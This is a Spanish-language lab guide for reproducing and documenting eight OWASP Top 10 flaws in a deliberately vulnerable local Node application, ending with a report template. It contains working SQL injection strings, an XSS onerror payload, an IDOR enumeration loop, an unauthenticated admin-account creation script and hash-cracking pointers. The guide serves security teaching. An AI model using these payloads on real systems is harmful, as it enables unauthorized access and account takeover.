# 🚀 GUÍA PRÁCTICA: ANÁLISIS OWASP TOP 10

## Parte 1: Iniciar la Aplicación Vulnerable

### Paso 1: Abrir Terminal en VS Code

1. Abre VS Code
2. Ve a: `File → Open Folder` → Selecciona `c:\Users\rock_\Desktop\juice-shop-analisis-owasp`
3. Presiona `Ctrl + '` para abrir terminal integrada

### Paso 2: Navegar y Ejecutar

```powershell
# En la terminal:
cd vulnerable-app
npm start
```

**Salida esperada:**
```
========================================
Aplicación vulnerable iniciada
Accede a: http://localhost:3000
========================================
```

### Paso 3: Acceder a la Aplicación

Abre en tu navegador: **http://localhost:3000**

Verás una interfaz morada con 8 secciones para testear vulnerabilidades.

---

## Parte 2: Análisis de Cada Vulnerabilidad

### 1️⃣ SQL INJECTION

**Ubicación**: Sección "SQL Injection" → Campo de búsqueda

**Pasos para reproducir:**

1. En el campo "Buscar usuario", ingresa:
   ```
   admin' --
   ```

2. Haz clic en "Buscar"

3. **Resultado esperado:**
   ```json
   {
     "id": 1,
     "username": "admin",
     "email": "admin@example.com"
   }
   ```

**¿Por qué es vulnerable?**
- El input se inserta directamente en la query SQL
- La comilla `'` cierra el string, y `--` comenta el resto
- Permite bypassear la búsqueda normal

**Payload alternativo para ver más datos:**
```
' UNION SELECT 1,username,email FROM users --
```

**Captura de pantalla sugerida:**
- Mostrar el campo con el payload
- Mostrar la respuesta con datos no autorizados

---

### 2️⃣ BROKEN AUTHENTICATION

**Ubicación**: Sección "Login"

**Pasos para reproducir:**

1. Ingresa credenciales:
   - Username: `admin`
   - Password: `password123`

2. Haz clic en "Iniciar Sesión"

3. **Resultado:**
   ```json
   {
     "success": true,
     "token": "MQ=="
   }
   ```

**Problemas identificados:**

a) **Token predecible:**
   - Decodificar "MQ==" en base64 → "1"
   - Cualquiera puede crear tokens para otros usuarios

b) **Credenciales en logs:**
   - Revisa la terminal del servidor
   - Verás: `[LOG] Login attempt - Username: admin, Password: password123`
   - ¡Contraseñas visibles!

**Captura de pantalla sugerida:**
- Mostrar credenciales ingresadas
- Mostrar token retornado
- Terminal mostrando las credenciales en logs

---

### 3️⃣ CROSS-SITE SCRIPTING (XSS)

**Ubicación**: Sección "Cross-Site Scripting"

**Pasos para reproducir:**

1. Primero, inicia sesión (sección Login):
   - Username: `admin`
   - Password: `password123`

2. En la sección XSS, haz clic en "Ver Perfil (Vulnerable)"

3. **Resultado:** Se renderiza HTML sin sanitizar

**Payload XSS para probar:**

En la consola del navegador (F12 → Console):
```javascript
// Este código muestra cómo se ejecutaría XSS
alert('XSS Vulnerable - Este código se ejecutó desde un atacante');

// Robo de cookies simulado
console.log('Document cookie:', document.cookie);
```

**¿Por qué es vulnerable?**
- Los datos del usuario (email, username) se renderizen en HTML sin escapar
- Si alguien inyecta `<img src=x onerror="alert('xss')">` como username...
- El script se ejecutaría automáticamente

**Captura de pantalla sugerida:**
- Mostrar HTML renderizado
- Mostrar código fuente con datos sin escapar
- Alert de JavaScript ejecutándose

---

### 4️⃣ INSECURE DIRECT OBJECT REFERENCES (IDOR)

**Ubicación**: Sección "Acceso Directo a Objetos"

**Pasos para reproducir:**

1. En el campo "Note ID", ingresa: `1`

2. Haz clic en "Ver Nota"

3. **Resultado:**
   ```json
   {
     "id": 1,
     "user_id": 1,
     "title": "Admin Notes",
     "content": "Configuración del servidor"
   }
   ```

4. **Sin estar autenticado** puedes ver notas privadas

**¿Por qué es vulnerable?**
- No verifica que seas el dueño de la nota
- El ID es predecible (1, 2, 3, ...)
- Enumeración completa posible

**Script para enumerar todas las notas:**
```javascript
// En consola del navegador
for (let i = 1; i <= 10; i++) {
  fetch(`http://localhost:3000/notes/${i}`)
    .then(r => r.json())
    .then(data => console.log(`Nota ${i}:`, data));
}
```

**Captura de pantalla sugerida:**
- Mostrar acceso a nota ID 1
- Mostrar que contiene datos sensibles
- Mostrar acceso a diferentes IDs

---

### 5️⃣ SECURITY MISCONFIGURATION

**Ubicación**: Sección "Información de Debug Expuesta"

**Pasos para reproducir:**

1. Haz clic en "Ver Información"

2. **Resultado:**
   ```json
   {
     "environment": "development",
     "databasePath": ":memory:",
     "secretKey": "super-secret-key-12345",
     "users": "SELECT * FROM users"
   }
   ```

**¿Por qué es vulnerabilidad?**
- Expone `secretKey` que se usa para generar tokens
- Información de debug en producción
- Patrón de queries SQL expuesto

**Impacto:**
- Con la `secretKey`, un atacante puede generar tokens válidos
- Suplantación de cualquier usuario

**Captura de pantalla sugerida:**
- Mostrar respuesta JSON con información sensible
- Destacar `secretKey` y `databasePath`

---

### 6️⃣ SENSITIVE DATA EXPOSURE

**Ubicación**: Sección "Datos de Usuario"

**Pasos para reproducir:**

1. En "User ID", ingresa: `1`

2. Haz clic en "Ver Datos"

3. **Resultado:**
   ```json
   {
     "id": 1,
     "username": "admin",
     "password": "$2a$10$...(hash bcrypt)...",
     "email": "admin@example.com",
     "role": "admin"
   }
   ```

**¿Por qué es vulnerable?**
- Se expone el hash de contraseña
- El rol se revela (atacante sabe que es admin)
- Email confirmado para ese usuario

**Ataque de diccionario:**
```bash
# Un atacante podría usar herramientas como:
# - John the Ripper
# - Hashcat
# Para crackear el hash offline
```

**Captura de pantalla sugerida:**
- Mostrar respuesta completa
- Destacar el hash de contraseña
- Mostrar que no debería retornar esos datos

---

### 7️⃣ MISSING ACCESS CONTROLS

**Ubicación**: Sección "Panel Admin"

**Pasos para reproducir:**

1. **Sin estar autenticado**, completa:
   - Username: `hacker`
   - Email: `hacker@evil.com`
   - Role: `Admin`

2. Haz clic en "Crear Usuario"

3. **Resultado:**
   ```json
   {
     "success": true,
     "userId": 3
   }
   ```

4. **¡Se creó una cuenta admin sin permiso!**

**¿Por qué es vulnerable?**
- No hay verificación de que seas administrador
- Cualquiera puede crear usuarios
- Puedes crear tu propio admin

**Script para automatizar:**
```javascript
fetch('http://localhost:3000/admin/users', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    username: 'hacker2',
    email: 'hacker2@evil.com',
    role: 'admin'
  })
}).then(r => r.json()).then(data => console.log(data));
```

**Captura de pantalla sugerida:**
- Mostrar formulario sin autenticación
- Mostrar éxito al crear usuario admin
- Mostrar nuevas credenciales

---

### 8️⃣ USING COMPONENTS WITH KNOWN VULNERABILITIES

**Ubicación**: Sección "Información de Debug" → Librerías

**Pasos para reproducir:**

1. Haz clic en "Ver Información"

2. En la respuesta JSON, verás:
   ```json
   {
     "libraries": [
       "express@4.18.2",
       "sqlite3@5.1.6"
     ]
   }
   ```

3. Abre terminal y ejecuta:
   ```powershell
   cd vulnerable-app
   npm audit
   ```

**Vulnerabilidades comunes:**
- Express 4.18.2: Puede tener issues menores
- SQLite3: Potencial para inyecciones
- Bcryptjs: Timing attacks

**Captura de pantalla sugerida:**
- Mostrar versiones de componentes
- Mostrar output de `npm audit`

---

## Parte 3: Documentar Hallazgos

### Formato de Documento para Cada Vulnerabilidad

Usa este formato para documentar:

```markdown
## Vulnerabilidad: [NOMBRE]

### Clasificación OWASP
- Categoría: A01:2021 o A02:2021, etc.
- Severidad: CRÍTICA / ALTA / MEDIA
- CWE: CWE-XXX

### Descripción
[Explica qué es la vulnerabilidad]

### Ubicación en el Código
- Archivo: server.js
- Línea: XXX
- Función: app.get('/endpoint')

### Código Vulnerable
\`\`\`javascript
[Muestra el código vulnerable]
\`\`\`

### Impacto
- Confidencialidad: Comprometida
- Integridad: Comprometida
- Disponibilidad: [Afectada/No afectada]

### Evidencia
[Describe cómo reproducir]
[Incluye capturas de pantalla]

### Corrección Recomendada
\`\`\`javascript
[Muestra el código seguro]
\`\`\`
```

---

## Parte 4: Crear Reporte Final

### Estructura del Reporte

```
1. PORTADA
   - Título
   - Fecha
   - Analista

2. RESUMEN EJECUTIVO
   - Total vulnerabilidades: 8
   - Críticas: 2
   - Altas: 5
   - Medias: 1

3. ÍNDICE

4. ANÁLISIS DETALLADO
   - Una sección por vulnerabilidad

5. CONCLUSIONES
   - Riesgos principales
   - Recomendaciones de remediación

6. ANEXOS
   - Capturas de pantalla
   - Código vulnerable
```

---

## Herramientas Útiles

### 1. DevTools del Navegador
- **F12** → Abre DevTools
- **Network** → Ver requests/responses
- **Console** → Ejecutar JavaScript
- **Sources** → Ver código de página

### 2. cURL (Alternativa a interfaz web)

```powershell
# SQL Injection
curl "http://localhost:3000/users/search?username=admin' --"

# Login
curl -X POST http://localhost:3000/login `
  -H "Content-Type: application/json" `
  -d '{\"username\":\"admin\",\"password\":\"password123\"}'

# Ver datos de usuario
curl "http://localhost:3000/api/user/1"

# Debug info
curl "http://localhost:3000/debug"
```

### 3. Postman
1. Descarga Postman: https://www.postman.com
2. Crea requests para cada endpoint
3. Guarda en colección
4. Exporta para documentación

---

## Checklist de Análisis

- [ ] SQL Injection - Reproducido y documentado
- [ ] Broken Authentication - Credenciales en logs capturadas
- [ ] XSS - Payload ejecutado en navegador
- [ ] IDOR - Acceso a recursos sin autorización
- [ ] Security Misconfiguration - Info sensible expuesta
- [ ] Sensitive Data Exposure - Contraseñas visibles
- [ ] Missing Access Controls - Panel admin accesible
- [ ] Components with Vulnerabilities - Identificadas versiones

---

## Próximos Pasos

1. ✅ Analizar cada vulnerabilidad
2. ✅ Capturar evidencia (pantallas)
3. ✅ Documentar impacto
4. ✅ Sugerir correcciones
5. ✅ Crear reporte profesional HTML

---

**¡Listo para comenzar el análisis!** 🚀

